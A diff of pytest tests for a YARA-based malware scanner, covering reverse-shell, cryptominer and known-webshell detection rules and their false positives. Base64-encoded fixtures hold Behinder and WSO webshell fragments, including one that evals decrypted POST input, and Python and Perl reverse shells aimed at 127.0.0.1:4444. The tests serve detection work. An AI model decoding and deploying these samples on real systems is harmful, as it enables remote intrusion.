@@ -118,6 +118,18 @@ def _perl_socket_shell_fixture() -> str:
     ).decode()
 
 
+_WEBSHELL_FIXTURES = {
+    "behinder_php": "PD9waHAgQGVycm9yX3JlcG9ydGluZygwKTsgc2Vzc2lvbl9zdGFydCgpOyAka2V5PSJlNDVlMzI5ZmViNWQ5MjViIjsKJF9TRVNTSU9OWydrJ109JGtleTsgJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CiRwb3N0PW9wZW5zc2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOyBldmFsKCRwb3N0KTsgPz4K",
+    "behinder_jsp": "PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qIiU+CjwlIFN0cmluZyBrPSJlNDVlMzI5ZmViNWQ5MjViIjsgc2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7CkNpcGhlciBjPUNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7ICU+Cg==",
+    "wso_php": "PD9waHAgZGVmaW5lKCdXU09fVkVSU0lPTicsICcyLjUnKTsKZnVuY3Rpb24gd3NvRXgoJGluKSB7ICRvdXQ9Jyc7IGlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKSB7IEBleGVjKCRpbiwkb3V0KTsgfQpyZXR1cm4gJG91dDsgfQo=",
+    "wso_mixed_case": "PD9waHAgZGVmaW5lKCJ3c29fdmVyc2lvbiIsICIyLjciKTsKZnVuY3Rpb24gV1NPRVgoJGluKSB7IHJldHVybiAkaW47IH0K",
+}
+
+
+def _webshell_fixture(name: str) -> str:
+    return base64.b64decode(_WEBSHELL_FIXTURES[name]).decode()
+
+
 def _has_rule(findings: list, rule_name: str) -> bool:
     """Return True when a finding message references a specific YARA rule."""
     return any(rule_name in f.message for f in findings)
@@ -692,6 +704,110 @@ class TestBuiltInMalwarePackaging:
         content = base64.b64decode(encoded).decode()
         assert not _has_rule(_run_builtin(content, filename), "reverse_shell")
 
+    @pytest.mark.parametrize("single_line", [False, True])
+    @pytest.mark.parametrize(
+        "encoded, filename, detected",
+        [
+            (
+                "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0"
+                "LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMjcuMC4wLjEiLCA0NDQ0KSkKc3VicHJvY2Vzcy5jYWxsKFsiL2Jp"
+                "bi9zaCIsICItaSJdLCBzdGRpbj1zLmZpbGVubygpLCBzdGRvdXQ9cy5maWxlbm8oKSwgc3RkZXJyPXMuZmlsZW5v"
+                "KCkpCg==",
+                "socket_streams.py",
+                True,
+            ),
+            (
+                "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnluYW1lKCJ0"
+                "Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbig0NDQ0LCBpbmV0X2F0b24oIjEyNy4wLjAuMSIpKSk7"
+                "Cm9wZW4gU1RESU4sICI8JlNPQ0tFVCI7Cm9wZW4gU1RET1VULCAiPiZTT0NLRVQiOwpvcGVuIFNUREVSUiwgIj4m"
+                "U09DS0VUIjsKZXhlYyAiL2Jpbi9zaCIsICItaSI7Cg==",
+                "perl_no_parens.pl",
+                True,
+            ),
+            (
+                "aW1wb3J0IHNvY2tldCwgc3VicHJvY2Vzcywgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNv"
+                "Y2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTI3LjAuMC4xIiwgODA4MCkpCmxvZ2ZpbGUgPSBvcGVuKCJj"
+                "bGllbnQubG9nIiwgInciKQpvcy5kdXAyKGxvZ2ZpbGUuZmlsZW5vKCksIDEpCnN1YnByb2Nlc3MucnVuKFsiL2Jp"
+                "bi9zaCIsICItYyIsICJkYXRlIl0sIGNoZWNrPVRydWUpCnMuc2VuZGFsbChiImhlYWx0aGNoZWNrXG4iKQpzLmNs"
+                "b3NlKCkK",
+                "local_file_shell.py",
+                False,
+            ),
+            (
+                "aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcwpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0"
+                "LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCIxMjcuMC4wLjEiLCA4MDgwKSkKbG9nZmlsZSA9IG9wZW4oImNsaWVu"
+                "dC5sb2ciLCAidysiKQpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwgIi1jIiwgImRhdGUiXSwgc3RkaW49bG9n"
+                "ZmlsZS5maWxlbm8oKSwgc3Rkb3V0PWxvZ2ZpbGUuZmlsZW5vKCksIHN0ZGVycj1sb2dmaWxlLmZpbGVubygpKQo=",
+                "local_file_streams.py",
+                False,
+            ),
+        ],
+    )
+    def test_socket_stream_relationships(self, encoded, filename, detected, single_line):
+        content = base64.b64decode(encoded).decode()
+        if single_line:
+            content = content.replace("\n", " " if filename.endswith(".pl") else "; ")
+        assert _has_rule(_run_builtin(content, filename), "reverse_shell") is detected
+
+    @pytest.mark.parametrize(
+        "variant",
+        [
+            "unknown",
+            "dynamic",
+            "oversized",
+            "invalid",
+            "wrapped",
+            "exec",
+            "wildcard",
+            "opener",
+            "with_rebind",
+            "namedexpr",
+            "import_rebind",
+            "import_side_effect",
+        ],
+    )
+    def test_uncertain_python_bindings_keep_reverse_shell_candidate(self, variant):
+        content = _python_socket_shell_fixture()
+        if variant == "unknown":
+            content = content.replace("s.fileno()", "stream.fileno()")
+        elif variant == "dynamic":
+            content = "if True:\n" + "\n".join("    " + line for line in content.splitlines())
+        elif variant == "oversized":
+            content = "#" + "x" * 8192 + "\n" + content
+        elif variant == "invalid":
+            content = "unparsed ! syntax\n" + content
+        elif variant in {"exec", "wildcard", "namedexpr", "import_rebind", "import_side_effect"}:
+            content = content.replace("os.dup2", "f=open('client.log', 'w')\nos.dup2", 1)
+            if variant == "exec":
+                content = content.replace("os.dup2", 'exec("f = s")\nos.dup2', 1)
+            elif variant == "wildcard":
+                content = "from custom_io import *\n" + content
+            elif variant == "namedexpr":
+                content = content.replace("os.dup2", "(f := s)\nos.dup2", 1)
+            elif variant == "import_rebind":
+                content = content.replace("os.dup2", "from socket_stream import f\nos.dup2", 1)
+            else:
+                content = "import custom_open\n" + content
+            content = content.replace("os.dup2(s.fileno()", "os.dup2(f.fileno()")
+        elif variant == "opener":
+            offset = content.index("os.dup2")
+            tail = content[offset:].replace("s.fileno()", "f.fileno()")
+            content = (
+                content[:offset]
+                + "with open('client.log', opener=lambda *_: s.fileno()) as f:\n"
+                + "\n".join("    " + line for line in tail.splitlines())
+            )
+        elif variant == "with_rebind":
+            content = content.replace(
+                "s=socket.socket",
+                "f=open('log', 'w')\nwith open('other', 'w') as other:\n    f=socket.socket",
+            )
+            content = content.replace("s.connect", "f.connect").replace("s.fileno()", "f.fileno()")
+        else:
+            content = content.replace("os.dup2", "wrapped=open(s.fileno(), 'r+')\nos.dup2", 1)
+            content = content.replace("os.dup2(s.fileno()", "os.dup2(wrapped.fileno()")
+        assert _has_rule(_run_builtin(content, "uncertain.py"), "reverse_shell")
+
     def test_extra_rules_still_match_with_builtin_malware_representation(self, tmp_path):
         _write_rule(
             tmp_path,
@@ -707,6 +823,89 @@ class TestBuiltInMalwarePackaging:
         )
         assert _has_rule(findings, "extra_marker")
         assert _has_rule(findings, "reverse_shell")
+
+
+# ── Built-in cryptominer rules ───────────────────────────────────────
+
+
+class TestBuiltInCryptominerRules:
+    """Regression coverage for crypto_coinjacking's $wasm_miner string.
+
+    Unbounded ``(mine|hash|crypto)`` matched inside unrelated identifiers
+    (``deteRMINE``) and against common, benign Web APIs/module names
+    (``crypto.getRandomValues``, ``hashmap``) that routinely appear near any
+    ``WebAssembly.instantiate`` call, firing a CRITICAL cryptojacking finding
+    on ordinary code.
+    """
+
+    def test_wasm_instantiate_with_unrelated_hash_call_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ hashmap.set(r,1) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_web_crypto_api_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ crypto.getRandomValues(buf) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_mid_word_mine_is_not_coinjacking(self):
+        content = "WebAssembly.instantiate(bytes).then(r=>{ return determine(r) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_text_mining_prose_is_not_coinjacking(self):
+        """`mining` as English prose must not fire; only a mining call does."""
+        content = (
+            "WebAssembly.instantiate(bytes).then(m=>runAnalytics(m)); // helpers for text mining\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert not _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_start_mining_call_is_coinjacking(self):
+        """`startMining(` is a mining call even though `Mining` is mid-identifier."""
+        content = "WebAssembly.instantiate(w).then(m=>{ m.exports.startMining(pool) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_capitalised_miner_is_coinjacking(self):
+        """Case must not matter: `new Miner(` is the common CoinHive-era shape."""
+        content = "WebAssembly.instantiate(w).then(m=>{ var x = new Miner(siteKey) })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_literal_miner_call_is_coinjacking(self):
+        content = "WebAssembly.instantiate(minerWasm).then(function(m){ m.exports.mine(); })\n"
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_cryptonight_glue_is_coinjacking(self):
+        content = (
+            "WebAssembly.instantiate(wasmBinary,info);"
+            "var _cryptonight_hash=Module._cryptonight_hash=function(){};\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_hash_cn_cwrap_is_coinjacking(self):
+        content = 'WebAssembly.instantiate(x).then(()=>{ Module.cwrap("hash_cn", "number", ["number"]) })\n'
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_cryptonight_wasm_fetch_is_coinjacking(self):
+        content = (
+            'WebAssembly.instantiateStreaming(fetch("cryptonight.wasm"))'
+            ".then(o=>{ exports.cn_hash(blob,nonce++) })\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
+
+    def test_wasm_instantiate_with_randomx_calculate_hash_is_coinjacking(self):
+        content = (
+            "WebAssembly.instantiate(randomxWasm)"
+            ".then(m=>m.instance.exports.randomx_calculate_hash(blob))\n"
+        )
+        findings = _run_builtin(content, "loader.js")
+        assert _has_rule(findings, "crypto_coinjacking")
 
 
 # ── Built-in agent skill rules ────────────────────────────────────────
@@ -877,6 +1076,47 @@ rule agent_skill_destructive_autonomous_actions {
 """
         findings = _run_builtin(content, "README.md")
         assert not _has_rule(findings, "agent_skill_credential_exfiltration_webhook")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "Zu kleine Schrift behindert das Lesen. Menschen mit Behinderung\n"
+            "brauchen ausreichende Kontraste.\n",
+            "We deploy the API on WSO 2 Micro Integrator.\n",
+            "This skill detects Behinder and WSO webshells in uploaded files.\n",
+        ],
+        ids=["german_prose", "wso2_product_name", "family_names_in_docs"],
+    )
+    def test_known_webshell_rule_ignores_prose(self, content):
+        findings = _run_builtin(content, "SKILL.md")
+        assert not _has_rule(findings, "php_webshell_known")
+
+    @pytest.mark.parametrize(
+        "content",
+        [
+            "<?php define('WSO_VERSION', '0.5.2'); ?>\n",
+            "function wsoEx($input) { return $input; }\n",
+            "function wsoSecParam($name, $value) { return $value; }\n",
+            "Known indicator: e45e329feb5d925b\n",
+        ],
+        ids=["version_constant", "execution_helper", "security_helper", "key_in_docs"],
+    )
+    def test_known_webshell_rule_ignores_isolated_family_markers(self, content):
+        findings = _run_builtin(content, "reference.php")
+        assert not _has_rule(findings, "php_webshell_known")
+
+    @pytest.mark.parametrize(
+        ("fixture", "filename"),
+        [
+            ("behinder_php", "shell.php"),
+            ("behinder_jsp", "shell.jsp"),
+            ("wso_php", "shell.php"),
+            ("wso_mixed_case", "shell.php"),
+        ],
+    )
+    def test_known_webshell_rule_matches_family_markers(self, fixture, filename):
+        findings = _run_builtin(_webshell_fixture(fixture), filename)
+        assert _has_rule(findings, "php_webshell_known")
 
 
 # ── Rule caching ──────────────────────────────────────────────────────
